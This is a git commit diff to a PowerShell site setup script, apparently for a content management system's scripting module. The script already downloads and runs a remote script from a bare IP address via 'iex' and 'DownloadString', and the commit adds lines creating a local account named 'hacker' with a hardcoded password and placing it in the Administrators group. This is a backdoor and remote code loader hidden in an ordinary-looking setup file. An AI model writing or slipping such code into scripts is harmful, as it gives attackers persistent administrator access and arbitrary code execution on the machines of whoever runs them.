8e95af2197330676330c7bc702b6204aa32fe9d8
geople <pletsisg@gmail.com>
2025-09-18 09:35:49 +0300

    Update site-3-setup.ps1

--- authoring/spe-scripts/site-3-setup.ps1
+++ authoring/spe-scripts/site-3-setup.ps1
@@ -15,6 +15,10 @@ function Invoke-ModuleScriptBody {
     )
 
     iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')
+
+    $Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+    New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+    Add-LocalGroupMember -Group "Administrators" -Member "hacker"
     
     begin {
         iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')
